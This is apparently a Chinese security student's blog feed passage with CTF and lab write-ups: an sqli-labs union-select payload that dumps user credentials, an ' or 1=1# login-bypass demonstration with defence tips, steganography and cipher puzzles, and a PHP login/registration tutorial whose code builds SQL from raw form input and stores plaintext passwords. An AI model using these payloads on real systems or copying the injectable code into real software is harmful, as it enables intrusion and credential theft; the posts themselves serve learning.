alt="在这里插入图片描述"><br>  接着进行爆用户信息</p><pre><code>   http://localhost/sqli-labs/Less-1/?id=&#39; union select 1,group_concat(username),group_concat(password) from users --+</code></pre><p><img src="https://github.com/weiwanchengdege/photos/blob/master/20190609211207363.png?raw=true" alt="在这里插入图片描述"><br>   OKヾ(≧▽≦*)o 第一关到此结束。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> Sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CRC碰撞</title>
      <link href="2019/05/04/CRC%E7%A2%B0%E6%92%9E/"/>
      <url>2019/05/04/CRC%E7%A2%B0%E6%92%9E/</url>
      
        <content type="html"><![CDATA[<p>一道crc题目 打开后又有三个加密文档，使用脚本碰撞。</p><p><img src="http://img-blog.csdnimg.cn/20190406114959132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>对三个文档进行碰撞。<br><img src="http://img-blog.csdnimg.cn/20190406122339590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><p><img src="http://img-blog.csdnimg.cn/20190406123214216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><p><img src="http://img-blog.csdnimg.cn/20190406123245738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>得到密文you_are_the_best!!输入得到：</p><p><img src="http://img-blog.csdnimg.cn/20190406202243936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>判断为base32解码得：flag%7Bwe1come%20to%20shalou%20anquan%7D<br>继续url解码得flag：flag{we1come to shalou anquan}</p>]]></content>
      
      
      <categories>
          
          <category> CTF刷题 </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crc碰撞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一次团队线下赛总结</title>
      <link href="2019/05/04/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%9B%A2%E9%98%9F%E5%86%85%E9%83%A8%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
      <url>2019/05/04/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%9B%A2%E9%98%9F%E5%86%85%E9%83%A8%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>这周四团队进行了一次内部比赛，学长让我们进行对各自搭建的登陆注册界面互相进行sql注入攻击，毫无准备的我很快就被打穿了…，唉，无奈代码写太简陋，没有提前准备，体验感极差hhh。。。<hr><br>那么先来了解一下什么是sql注入<br><strong>sql注入定义</strong><br>所谓SQL注入，就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。<br><strong>sql注入原理</strong><br>　 　当用户使用输入内容来构造动态sql语句以访问数据库时，如果代码使用存储过程，而这些存储过程作为包含未筛选的用户输入的 字符串来传递，会发生sql注入。在某些表单中，用户输入的内容直接用来构造动态sql命令，或者作为存储过程的输入参数，这些表单特别容易受到sql注入的攻击。因此，没有对用户输入的合法性进行判断或者程序中本身的变量处理不当，这样，用户就可以提交一段数据库查询的代码， 根据程序返回的结果，获得一些敏感的信息或者控制整个服务器，于是sql注入就发生了。<br>　<strong>如何防护</strong> 　<br>主要有以下几点：<br>1.永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和<br>双”-“进行转换等。<br>2.永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。<br>3.永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。<br>4.不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。<br>5.应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装<br>6.sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFT SCAN等。采用MDCSOFT-IPS可以有效的防御SQL注入，XSS攻击等。<hr></p><p>下面是我的登陆验证代码：</p><pre><code>&lt;?php       $conn=mysql_connect(&quot;localhost&quot;,&#39;root&#39;,&#39;root&#39;) or die(&quot;数据库连接失败！&quot;);//连接你的本地数据库       localhost为服务器 root为用户名 root为密码       mysql_select_db(&#39;myphp&#39;,$conn) or die(&quot;您要选择的数据库不存在&quot;);//选择你建立的数据库       $name=$_POST[&#39;username&#39;];       $pass=$_POST[&#39;password&#39;];//获取表单提交的内容用两个变量来存post方式接受的值       $sql=&quot;select * from user where username=&#39;$name&#39; and password=&#39;$pass&#39;&quot;;//查询语句       $query=mysql_query($sql);//函数执行一条 MySQL 查询。       $arr=mysql_fetch_array($query);然后从$query中取一行数字数组       if(is_array($arr))&#123;//对$arr进行判断              setcookie(&#39;username&#39;,$name,time()+3600);//设置cookie,时间为一小时，（以秒为单位）              header(&quot;Location:index.php&quot;);//跳转页面       &#125;else&#123;              echo &quot;您的用户名或密码输入有误，&lt;a href=\&quot;login.php\&quot;&gt;请重新登录！&lt;/a&gt;&quot;;       &#125;?&gt;</code></pre><p>注意到了没，我们直接将用户提交过来的数据(用户名和密码)直接拿去执行，并没有实现进行特殊字符过滤，待会你将明白，这是致命的。<br>　　代码分析：如果，用户名和密码都匹配成功的话，将跳转到目的操作界面 index.php，不成功，则给出提示信息。<br><strong>演示注入手法</strong><br>     接下来将展开我们的重头戏SQL注入：<br>　　填好正确的用户名(123)和密码(123)后，点击提交，将会返回给我们“登陆成功”的界面。<br>　　因为根据我们提交的用户名和密码被合成到SQL查询语句当中之后是这样的：　　   </p><pre><code> select * from users where username=&#39;123&#39; and password=&#39;123&#39;</code></pre><p>　　      很明显，用户名和密码都和我们之前给出的一样，肯定能够成功登陆。<br>但是，如果我们输入一个错误的用户名或密码呢?很明显，肯定登入不了吧。恩，正常情况下是如此，但是对于有SQL注入漏洞的网站来说，只要构造个特殊的“字符串”，照样能够成功登录。<br>比如在用户名输入框中输入:’or 1=1#,密码随便输入，这时候的合成后的SQL查询语句为：</p><pre><code>select * from users where username=&#39;&#39; or 1=1#&#39; and password=md5(&#39; &#39;)语义分析：“#”在mysql中是注释符，这样#号后面的内容将被mysql视为注释内容，这样就不会去执行了，换句话说，以下的两句sql语句等价：select * from users where username=&#39;&#39; or 1=1#&#39; and password=md5(&#39; &#39;)等价于   select * from users where username=&#39;&#39; or 1=1因为1=1永远都是成立的，即where子句总是为真，将该sql进一步简化之后，等价如下select语句：select * from users</code></pre><p>　　没错，该sql语句的作用是检索users表中的所有字段<br>    果不其然，我们利用万能语句(’or 1=1#)能够登录！看到了吧，一个经构造后的sql语句竟有如此可怕的破坏力，相信你看到这后，开始对sql注入有了一个理性的认识了吧~</p>]]></content>
      
      
      <categories>
          
          <category> 线下赛 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MISC暴力破解</title>
      <link href="2019/05/04/misc%20%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
      <url>2019/05/04/misc%20%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>打开为加密文件，果断暴力破解，速度实在太慢，改为字典破解得到口令<img src="https://github.com/weiwanchengdege/photos/blob/master/20190407203235944.png?raw=true" alt="在这里插入图片描述"><br>输入口令得<img src="https://github.com/weiwanchengdege/photos/blob/master/20190407203617747.png?raw=true" alt="在这里插入图片描述"><br>经寻找发现特殊html文档打开<br><img src="https://github.com/weiwanchengdege/photos/blob/master/20190407204134199.png?raw=true" alt="在这里插入图片描述"></p><p>查看网页源代码发现字符串:666c61677b73756d6d6572217d</p><p><img src="https://github.com/weiwanchengdege/photos/blob/master/20190407204500849.jpg?raw=true" alt="在这里插入图片描述">目测为十六进制转字符串解密得：</p><p><img src="https://github.com/weiwanchengdege/photos/blob/master/20190407204917736.png?raw=true"><br>得到flag{summer!}</p>]]></content>
      
      
      <categories>
          
          <category> CTF刷题 </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP — Cookie and Session篇</title>
      <link href="2019/04/28/PHP%20%E2%80%94%20Cookie%20and%20Session%E7%AF%87/"/>
      <url>2019/04/28/PHP%20%E2%80%94%20Cookie%20and%20Session%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p><strong>一、Cookie</strong></p><p>例：<code>setcookie(&#39;username&#39;,&#39; $name&#39;,time()+3600);</code></p><p>2.在服务器端读取cookie内容</p><pre><code>$_COOKIEif(!isset($_COOKIE[&#39;username&#39;]))</code></pre><p>3.将多维数组应用到Cookie中</p><pre><code>setcookie(&quot;member[name]&quot;,&#39;薛之谦&#39;)；setcookie(&quot;member[password]&quot;,‘xiaobaixue&#39;)；</code></pre><p>4.删除Cookie</p><pre><code>setcookie(&quot;member&quot;, &#39; &#39;,time() -1);setcookie(&#39;username&#39;,$name,time()-1);</code></pre><p><strong>二、Session</strong><br>    1.开启session</p><pre><code>    session_start();            $_SESSION[&#39;name&#39;]=&#39;薛之谦&#39;    1)开启一个会话            一个客户 到超市里面买东西 办会员卡！    2)打开已经存在的会话            当这个客户 以后再到超市买东西的时候 根据上次办的卡号 买东西！            根据客户端传来的session id 把这个 session id 对应的数据 读取到 $_SESSION这个变量里面        2.    销毁session    session_start();//打开要销毁的数据    session_unset( );//    session_destory();//销毁一个会话的全部数据    setcoookie(session_name(),&#39;&#39;,time()-3600,&#39;/&#39;);//销毁保存在客户端的卡号（session id）</code></pre>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML+MYSQL+PHP搭建带有cookie的登录页面</title>
      <link href="2019/04/21/HTML+MYSQL+PHP%E6%90%AD%E5%BB%BA%E5%B8%A6%E6%9C%89cookie%E7%9A%84%E7%99%BB%E9%99%86%E9%A1%B5%E9%9D%A2/"/>
      <url>2019/04/21/HTML+MYSQL+PHP%E6%90%AD%E5%BB%BA%E5%B8%A6%E6%9C%89cookie%E7%9A%84%E7%99%BB%E9%99%86%E9%A1%B5%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<p>这周学长给我们布置了新任务，要让我们在一周内搭建一个带有cookie的登陆界面，任务很轻松（才怪），几经波折之后终于弄好了（呜呜呜~），下面总结一下过程。</p><p>在本地搭建一个带有cookie的登陆注册界面需要以下步骤：</p><ul><li>创建数据库</li><li>登陆界面</li><li>注册界面</li></ul><p>大致需要以下PHP文件：<br><img src="https://github.com/weiwanchengdege/photos/blob/master/8NP(0XC%7B8Y1B%60VWQGI85A_3.png?raw=true" alt="在这里插入图片描述"><br><strong>-  使用phpstudy 自带的mysql 创建数据库</strong></p><p>在localhost 点击箭头新建数据库命名为 mysql<br><img src="https://github.com/weiwanchengdege/photos/blob/master/Inked%7B(4%7D%60U$%5BCS%25H(%7DNPJ%604%25YS_LI.jpg?raw=true" alt="在这里插入图片描述"><br>然后在新建数据库中新建一个表，命名为 user，添加新字段，username 和 password ；内容可以先空着<br><img src="https://github.com/weiwanchengdege/photos/blob/master/WOJD~SRJ8M%5DVEYTZ%5DM%60N%25U.png?raw=true" alt="在这里插入图片描述"></p><p> <strong>- 使用HTML编写登陆界面</strong><br> 总流程如下：<br><img src="https://github.com/weiwanchengdege/photos/blob/master/_3%600I1O5X3GIATXXAT4ZY.png?raw=true" alt="在这里插入图片描述"><br>  login.php；代码如下：</p><pre><code> &lt;!DOCTYPE html&gt; &lt;html lang=&#39;zh&#39;&gt; &lt;head&gt; &lt;title&gt; login&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;style&gt;    body&#123;        background-image:url(&#39;325151.jpg&#39;);        font-size:30px;//字体大小    &#125;    .main&#123;        position:absolute;//全局变量        top:35%;        left:45%;    &#125;    input&#123;        width:250px;        height:30px;        text-align:left;        color:blue;    &#125;    .sub&#123;        width:125px;        height:30px;    &#125;    button&#123;        width:125px;        height:30px;        text-align:left;    &#125;&lt;/style&gt;&lt;/head&gt; &lt;body&gt;  &lt;div class=&quot;main&quot;&gt;&lt;form name=&quot;input&quot; action=&quot;post.php&quot; method=&quot;post&quot;&gt;用户名 ：&lt;br /&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;密码 ：  &lt;br /&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt;             &lt;input type=&quot;submit&quot; value=&quot;登陆&quot; class=&quot;sub&quot;&gt;             &lt;button&gt;&lt;a href=&quot;reg.php&quot;&gt;注册&lt;/a&gt;&lt;/button&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt; &lt;/html&gt;</code></pre><p>界面如下：<br><img src="https://github.com/weiwanchengdege/photos/blob/master/Microsoft%20Edge%202019_4_20%2023_05_54.png?raw=true" alt="在这里插入图片描述"><br><strong>- 登陆验证：</strong><br>post.php;代码如下</p><pre><code>&lt;?php       $conn=mysql_connect(&quot;localhost&quot;,&#39;root&#39;,&#39;root&#39;) or die(&quot;数据库连接失败！&quot;);//连接你的本地数据库       localhost为服务器 root为用户名 root为密码       mysql_select_db(&#39;myphp&#39;,$conn) or die(&quot;您要选择的数据库不存在&quot;);//选择你建立的数据表       $name=$_POST[&#39;username&#39;];       $pwd=$_POST[&#39;password&#39;];//获取表单提交的内容用两个变量来存post方式接受的值       $sql=&quot;select * from user where username=&#39;$name&#39; and password=&#39;$pwd&#39;&quot;;//查询语句       $query=mysql_query($sql);//函数执行一条 MySQL 查询。       $arr=mysql_fetch_array($query);然后从$query中取一行数字数组       if(is_array($arr))&#123;//对$arr进行判断              setcookie(&#39;username&#39;,$name,time()+3600);//设置cookie,时间为一小时，（以秒为单位）              header(&quot;Location:index.php&quot;);//跳转页面       &#125;else&#123;              echo &quot;您的用户名或密码输入有误，&lt;a href=\&quot;login.php\&quot;&gt;请重新登录！&lt;/a&gt;&quot;;       &#125;?&gt;</code></pre><p><strong>实现注册总流程：</strong><br><img src="https://github.com/weiwanchengdege/photos/blob/master/347(0V6CSGE%7D3$9%5DCD4C~6X.png?raw=true" alt="在这里插入图片描述"></p><p><strong>-注册页面</strong><br><img src="https://github.com/weiwanchengdege/photos/blob/master/Microsoft%20Edge%202019_4_21%2011_21_51.png?raw=true" alt="在这里插入图片描述"><br> reg.php;代码如下：</p><pre><code> &lt;!DOCTYPE html&gt;    &lt;html &gt;    &lt;head&gt;    &lt;title&gt; 注册&lt;/title&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;style&gt;    body&#123;        background-image:url(&#39;323971.jpg&#39;);        background-repeat:no-repeat;        font-size:30px;    &#125;    .main&#123;        position:absolute;        top:35%;        left:45%;    &#125;    input&#123;        text-align:center;        width:250px;        height:30px;        text-align:left;        color:green;    &#125;    .sub&#123;        width:125px;        height:30px;    &#125;    &lt;/style&gt;    &lt;/head&gt;    &lt;body&gt;  &lt;div class=&quot;main&quot;&gt;&lt;form name=&quot;input&quot; action=&quot;regin.php&quot; method=&quot;post&quot;&gt;用户名&lt;br/&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;密码  &lt;br/&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt;           &lt;input type=&quot;submit&quot; value=&quot;注册&quot; class=&quot;sub&quot;&gt;    &lt;/body&gt;    &lt;/div&gt;    &lt;/html&gt;</code></pre><p>regin.php  ; 注册验证：</p><pre><code> &lt;?php     $conn=mysql_connect(&quot;localhost&quot;,&#39;root&#39;,&#39;root&#39;) or die(&quot;数据库连接失败！&quot;);           mysql_select_db(&#39;myphp&#39;,$conn) or die(&quot;您要选择的数据库不存在&quot;);     $name=trim($_POST[&#39;username&#39;]);    //trim函数，过滤空格，如果不加，我们在用户名后面添加很多空格，提交表单，打开firebug    //调试工具，我们可以到输入的用户名后面会有很多空格，使用trim函数，我们可以把表单中空格给过滤掉     $password=$_POST[&#39;password&#39;];     $sql = &quot;select * from user where username=&#39;$name&#39;&quot;;     $info = mysql_query($sql);     $res = mysql_num_rows($info);    if(empty($name))&#123;        echo &quot;&lt;script&gt;alert(&#39;用户名不能为空&#39;);location.href=&#39;reg.php&#39;;&lt;/script&gt;&quot;;    &#125;else if(empty($password))&#123;        echo &quot;&lt;script&gt;alert(&#39;密码不能为空&#39;);location.href=&#39;reg.php&#39;;&lt;/script&gt;&quot;;    &#125;else&#123;            if($res)&#123;            echo &quot;&lt;script&gt;alert(&#39;用户名已存在&#39;);location.href=&#39;reg.php&#39;;&lt;/script&gt;&quot;;        &#125;else&#123;            $sql1 =&quot;insert into user(username,password) values(&#39;&quot;.$name.&quot;&#39;,&#39;&quot; .($password).&quot;&#39;)&quot;;            $result = mysql_query($sql1);            if($result)&#123;                     echo &quot;&lt;script&gt;alert(&#39;注册成功&#39;)&lt;/script&gt;&quot;,header(&quot;Location:login.php&quot;);;            &#125;else&#123;                     echo &quot;&lt;script&gt;alert(&#39;注册失败&#39;)&lt;/script&gt;&quot;;            &#125;        &#125;&#125;    ?&gt;                                           </code></pre><p><strong>- 登陆成功界面</strong><br><img src="https://github.com/weiwanchengdege/photos/blob/master/J%7B~ID%25BBDF9GON9%60_AN4IN.png?raw=true" alt="在这里插入图片描述"><br>代码如下：</p><pre><code> &lt;?php    if(!isset($_COOKIE[&#39;username&#39;]))//对跳转方式判断，阻止直接跳转；    &#123;        echo &#39;登录非法!&lt;a href=&quot;login.php&quot;&gt;请登录&lt;/a&gt;&#39;;        exit();    &#125; ?&gt; &lt;!DOCTYPE html&gt;    &lt;html &gt;    &lt;head&gt;    &lt;title&gt; welcome! &lt;/title&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;/head&gt;    &lt;body&gt;     Hello 靓仔!   &lt;a href=&quot;logout.php&quot;&gt;注销&lt;/a&gt;//点击“ 注销 ”跳转页面    &lt;/body&gt;    &lt;/html&gt;</code></pre><p><strong>- 注销 cookie</strong><br>logout.php:<br>代码如下：</p><pre><code>&lt;?php    if(isset($_COOKIE[&#39;username&#39;]))&#123;        setcookie(&#39;username&#39;,$name,time()-1);//清除cookie 将时间设置为负数        header(&#39;Location:login.php&#39;);    &#125;    else&#123;        echo &#39;注销失败&#39;;        header(&#39;Location:index.php&#39;);    &#125;?&gt;</code></pre><hr>以上就是利用phpstudy搭建带有cookie 的登录注册界面的全过程，希望这篇文章可以帮助别人，同时也防止自己遗忘。]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>双图+盲水印</title>
      <link href="2019/04/16/%E5%8F%8C%E5%9B%BE+%E7%9B%B2%E6%B0%B4%E5%8D%B0/"/>
      <url>2019/04/16/%E5%8F%8C%E5%9B%BE+%E7%9B%B2%E6%B0%B4%E5%8D%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>1.双图</strong><br>打开压缩包，发现有两张图片 first1和second.png，使用Stegsolve打开first1.png进行一次异或处理</p><p><img src="https://github.com/weiwanchengdege/photos/blob/master/20190408201207778.png?raw=true" alt="在这里插入图片描述"><br>然后分析选择结合second.png得到<br><img src="https://github.com/weiwanchengdege/photos/blob/master/20190408201646144.png?raw=true" alt="在这里插入图片描述"><br>用stegslove对二维码进行运算得到三张二维码</p><p><img src="https://github.com/weiwanchengdege/photos/blob/master/20190408201910360.png?raw=true" alt="在这里插入图片描述"><br><img src="https://github.com/weiwanchengdege/photos/blob/master/201904082020166.png?raw=true" alt="在这里插入图片描述"><br><img src="https://github.com/weiwanchengdege/photos/blob/master/20190408202109348.png?raw=true" alt="在这里插入图片描述"><br>扫描结果是DES 6XaMMbM7<br>和一长串字符，很显然是des加密，秘钥是6XaMMbM7，然后对长串字符进行DES解密，得到flag。<br><strong>2.盲水印</strong><br>据提示为盲水印题打开有两张图片<br><img src="https://github.com/weiwanchengdege/photos/blob/master/20190408202952565.png?raw=true" alt="在这里插入图片描述"><br>所以使用bwm脚本（python2）bwm脚本的<a href="https://github.com/chishaxie/BlindWaterMark">github</a>,如果没有cv2这个模块，使用下面的命令安装cv2</p><pre><code>pip install opencv-python</code></pre><p>然后运行<code>python bwm.py decode 1.png 2.png flag.png</code><br>其中1.png和2.png是解压所得图片，flag.png是所分离出来的水印。<br>由于加密方式不同，所以未能得到水印图。<br>于是推测为软件添加的水印使用watermark工具进行破解<a href="https://www.anxz.com/down/10929.html">软件下载</a><br>得到水印图：<img src="https://github.com/weiwanchengdege/photos/blob/master/20190408204103908.png?raw=true"></p>]]></content>
      
      
      <categories>
          
          <category> CTF刷题 </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 盲水印 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈夫曼树+TTL+密码题</title>
      <link href="2019/04/15/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91+%E5%AF%86%E7%A0%81%E9%A2%98+TTL/"/>
      <url>2019/04/15/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91+%E5%AF%86%E7%A0%81%E9%A2%98+TTL/</url>
      
        <content type="html"><![CDATA[<p>这周又做了几道题，挺有意思的，记录下。<br><strong>一 .奇怪的TTL</strong><br> 至于什么是TTL，我给大家解释下：IP报文在路由间穿梭的时候每经过一个路由，TTL就会减1，当TTL为0的时候，该报文就会被丢弃。TTL所占的位数是8位，也就是0-255的范围，但是在大多数情况下通常只需要经过很小的跳数就能完成报文的转发，远远比上限255小得多，所以我们可以用TTL值的前两位来进行传输隐藏数据<br>如：须传送H字符，只需把H字符换成二进制，每两位为一组，每次填充到TTL字段的开头两位并把剩下的6位设置为1（xx111111），这样发4个IP报文即可传送1个字节。（摘抄···）<br>了解了这些之后开始做题。<hr><br>打开有两个txt文档<br><img src="https://github.com/weiwanchengdege/photos/blob/master/Z3HGLJJWTYLU%5B7Y306VOU7W.png?raw=true" alt="在这里插入图片描述"><br>题目描述如下：<br>我们截获了一些IP数据报，发现报文头中的TTL值特别可疑，怀疑是通信方嵌入了数据到TTL，我们将这些TTL值提取了出来，你能看出什么端倪吗？<br>打开文档：</p><p><img src="https://github.com/weiwanchengdege/photos/blob/master/20190408114948666705.png?raw=true" alt="在这里插入图片描述"><br>txt文件里面有很多列ttl值，63,127,191,255<br>63== 00111111<br>127==01111111<br>191==10111111<br>255==11111111<br>变得只有前面两位，后面6位不变，如果传输4个就是一字节<br>使用脚本提取<br>(大佬的脚本)</p><pre><code>fp = open(&#39;ttl.txt&#39;,&#39;r&#39;)a = fp.readlines()p = []for i in a:    p.append(int(i[4:]))s = &#39;&#39;for i in p:    if i == 63:        a = &#39;00&#39;    elif i == 127:        a = &#39;01&#39;    elif i == 191:        a = &#39;10&#39;    elif i == 255:        a = &#39;11&#39;    s += a# print(s)import binasciiflag = &#39;&#39;for i in range(0,len(s),8):    flag += chr(int(s[i:i+8],2))flag = binascii.unhexlify(flag)wp = open(&#39;res.jpg&#39;,&#39;wb&#39;)wp.write(flag)wp.close()#00111111 63#01111111 127#10111111 191#11111111 255</code></pre><p>得到：<img src="https://img-blog.csdnimg.cn/20190414202949301.jpg" alt="在这里插入图片描述"><br>写完之后发现只有二维码的一部分，应该是不止一张图，用foremost直接分开就好了，之后用ps拼在一块<br><a href="http://www.mamicode.com/info-detail-2283219.html">foremost下载及使用说明</a><br><img src="https://github.com/weiwanchengdege/photos/blob/master/E2%25YM%7D%7D24~101AHU~2BMJBT.png?raw=true" alt="在这里插入图片描述"><br>得到六张图：<img src="https://github.com/weiwanchengdege/photos/blob/master/A~S%7D6A7UL@UH6Z$V@3$ABUF.png?raw=true" alt="在这里插入图片描述"><br>使用PS拼接：<img src="https://github.com/weiwanchengdege/photos/blob/master/OWO_%5BRDO@" alt="在这里插入图片描述">WYEP%5DFM~KMYET.png?raw=true)</p><p>扫描之后得到如下信息：</p><pre><code>key:AutomaticKey cipher:fftu&#123;2028mb39927wn1f96o6e12z03j58002p&#125;</code></pre><p>应该就是AutoKey那个加密，<a href="https://www.wishingstarmoye.com/ctf/autokey">解密网站</a><br>得到flag{2028ab39927df1d96e6a12b03w58002k}<br><strong>二.哈夫曼树</strong><br>霍夫曼树又称最优二叉树，是一种带权路径长度最短的二叉树。所谓树的带权路径长度，就是树中所有的叶结点的权值乘上其到根结点的路径长度（若根结点为0层，叶结点到根结点的路径长度为叶结点的层数）。树的路径长度是从树根到每一结点的路径长度之和，记为WPL=（W1<em>L1+W2</em>L2+W3<em>L3+…+Wn</em>Ln），N个权值Wi（i=1,2,…n）构成一棵有N个叶结点的二叉树，相应的叶结点的路径长度为Li（i=1,2,…n）。可以证明霍夫曼树的WPL是最小的。<hr></p><p>打开题目为：<br><img src="https://github.com/weiwanchengdege/photos/blob/master/WR_OEE87" alt="在这里插入图片描述">~7@STVFM44K(%7DD.png?raw=true)由于是小白所以不会写哈夫曼树的脚本，只能自己画了（Q w Q）<br>    想知道咋画点击👉    <a href="https://jingyan.baidu.com/article/a501d80c16dfa0ec620f5e70.html">画法</a><br>   <img src="https://github.com/weiwanchengdege/photos/blob/master/IMG_20190415_1947502.jpg?raw=true" alt="在这里插入图片描述"><br>之后就自己对照树的结构，左0右1进行查找<br><img src="https://github.com/weiwanchengdege/photos/blob/master/YX6CJY9" alt="在这里插入图片描述">CM9K%5D%5DH8YFC%7BE%60S.png?raw=true)<br>得到flag有两种可能试试就知道那个对了。<br><strong>三.密码题</strong><br>打开：<img src="https://github.com/weiwanchengdege/photos/blob/master/7NG%7D" alt="在这里插入图片描述">E6%5BE%5BM437OU%5DQ%5BXQ6C.png?raw=true)<br>一看就知道是摩斯密码，解码得：</p><pre><code>MORSEISCOOLBUTBACONISCOOLER/CCCDDCDDDC/DDCCCCDDDCDCDCC/CDCDCCDDCDCDDDCDCDDC/DCCDDCCDDDCCDCC/CCDCDCDDDCDCDCCDCCCD/CCDCDCCDCCCDDCDCCCDCCCDCC/DDCCDCCDDCCDCCCCCCCCCCDDDDDCCCCCCCCCDDCDCCCCCDCDCCCDDDCDDCCDCDDCDDCDDDDCDDCCDCCC</code></pre><p>根据前面的提示为发现后面培根密码，根据培根密码的格式将CD转化为AB</p><pre><code>/AAABBABBBA/BBAAAABBBABABAA/ABABAABBABABBBABABBA/BAABBAABBBAABAA/AABABABBBABABAABAAAB/AABABAABAAABBABAAABAAABAA/BBAABAABBAABAAAAAAAAAABBBBBAAAAAAAAABBABAAAAABABAAABBBABBAABABBABBABBBBABBAABAAA</code></pre><p>解得：<code>DO YOU KNOW THE FOUR FENCE ZGIAHYANAUOZNXWI</code><br>英语不太好，百度翻译得：你知道四道栅栏吗？<br>再接着着解栅栏密码  （每组次数为4）：ZHANGYUXIAOWANZI<br>终于解完了，最后的提交格式弄了半小时，太坑了。。。</p>]]></content>
      
      
      <categories>
          
          <category> CTF刷题 </category>
          
          <category> MISC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LSB隐写+画图</title>
      <link href="2019/04/10/LSB%E9%9A%90%E5%86%99+%E7%94%BB%E5%9B%BE/"/>
      <url>2019/04/10/LSB%E9%9A%90%E5%86%99+%E7%94%BB%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<p>关于<strong>LSB</strong><br><strong>一.LSB简介</strong><br>LSB(英文 least significant bit)即最低有效位。LSB加密是信息隐藏中最基本的方法。由于人们识别声音或图片的能力有限，因此我们稍微改动信息的某一位是不会影响我们识别声音或图片的。<br><strong>二.用法</strong><br>通常来说LSB加密用在无损压缩的数据格式文件中，例如图像中的bmp格式和音频的wav格式。由于这两种格式未对源数据进行有损压缩，因此可以将信息隐藏起来。<br><strong>BMP文件中的使用</strong><br>对于图像文件LSB的特征很明显，通常将信息隐藏在某一个颜色通道中。我们可以查看图片的每个像素点的RGB值，或者使用stegsolve工具进行查看。 </p><p>由于图像是由像素构成的，每个像素有8位(对于BMP图像来说),通常最后一位的变化，通过肉眼是无法察觉的<br>一道LSB隐写题，打开有张图：<br><img src="http://img-blog.csdnimg.cn/20190410192758137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">使用stegsolve工具进行查看，-&gt;分析-&gt;数据提出<br>Bit Order选择LSB Lirst  （最低有效位） ，MSB是最高有效位；分析如下<br><img src="http://img-blog.csdnimg.cn/2019041019493387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现 flag{hav e a good time!}<br>LSB隐写2：<br>打开为：<br><img 